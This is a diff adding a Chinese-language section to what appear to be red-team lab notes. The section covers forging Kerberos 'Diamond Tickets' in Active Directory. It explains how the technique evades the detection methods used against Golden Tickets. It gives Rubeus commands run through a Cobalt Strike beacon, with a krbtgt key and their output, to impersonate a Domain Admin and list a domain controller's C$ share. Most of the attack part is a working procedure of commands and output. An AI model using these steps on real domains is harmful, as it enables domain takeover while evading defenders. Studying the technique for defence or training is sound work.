@@ -251,6 +251,104 @@ beacon> ls \\dc-2\c$
 ...
 ```
 
+# Diamond Tickets
+
+## 什么是Diamond Tickets？
+与Golden Tickets一样，Diamond Tickets是一种 TGT，可用于以任何用户身份访问任何服务。
+
+
+## 为什么需要Diamond Tickets？
+
+首先要知道蓝队可以通过什么方法查找到Golden Tickets，通常有下面两种方法：
+
+1. 查找没有相应AS-REQ的TGS-REQ
+2. 查找有异常值的TGT，如给了10年的Mimikatz的生命周期
+
+Diamond Tickets为了规避上面两种被侦查的方法提出两个思路：
+
+1. TGS-REQs将有一个前面的AS-REQ。
+2. TGT是由DC签发的，这意味着它将有来自域的Kerberos策略的所有正确细节。 即使这些可以在金票中准确伪造，但它更复杂，容易出错。
+
+
+制作思路：
+钻石票是通过修改由DC签发的合法TGT的字段而制成的。 这是通过请求TGT，用域的krbtgt哈希值对其进行解密，修改票据的所需字段，然后重新加密来实现的。
+
+## 怎么制作Diamond Tickets？
+
+1. 使用Rubeus.exe生成钻石票
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1112 /groups:512 /krbkey:390b2f[...snip...]91a8aa /nowrap
+```
+
+参数解释:
+- /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
+- /ticketuser is the username of the principal to impersonate.
+- /ticketuserid is the domain RID of that principal.  This can be obtained using a command like ```powershell Get-DomainUser -Identity nlamb -Properties objectsid```.
+- /groups are the desired group RIDs (512 being Domain Admins).
+- /krbkey is the krbtgt AES256 hash.
+
+2. 上面命令生成的tgt
+```
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: +mzV4aOvQx3/dpZGBaVEhccq1t+jhKi8oeCYXkjHXw4=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIFgz [...snip...] MuSU8=
+
+[*] Decrypting TGT
+[*] Retreiving PAC
+[*] Modifying PAC
+[*] Signing PAC
+[*] Encrypting Modified TGT
+
+[*] base64(ticket.kirbi):
+
+doIFYj [...snip...] MuSU8=
+```
+
+使用Rubeus的```describe```命令查看tgt细节
+```
+C:\>C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=
+
+[*] Action: Describe Ticket
+
+  ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  nlamb
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  7/7/2022 8:41:46 AM
+  EndTime                  :  7/7/2022 6:41:46 PM
+  RenewTill                :  1/1/1970 12:00:00 AM
+  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  jp4k3G5LvXpIl3cuAnTtgLuxOWkPJIUjOEZB5wrHdVw=
+```
+
+把tgt导入session
+```
+beacon> make_token DEV\nlamb FakePass
+[+] Impersonated DEV\bfarmer
+
+beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
+
+beacon> ls \\dc-2\c$
+[*] Listing: \\dc-2\c$\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+          dir     02/19/2021 11:11:35   $Recycle.Bin
+          dir     02/10/2021 03:23:44   Boot
+          dir     10/18/2016 01:59:39   Documents and Settings
+```
+
+
+
 # Forged Certificates
 
 > Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate (think of this like the krbtgt hash being able to sign a forged TGT)
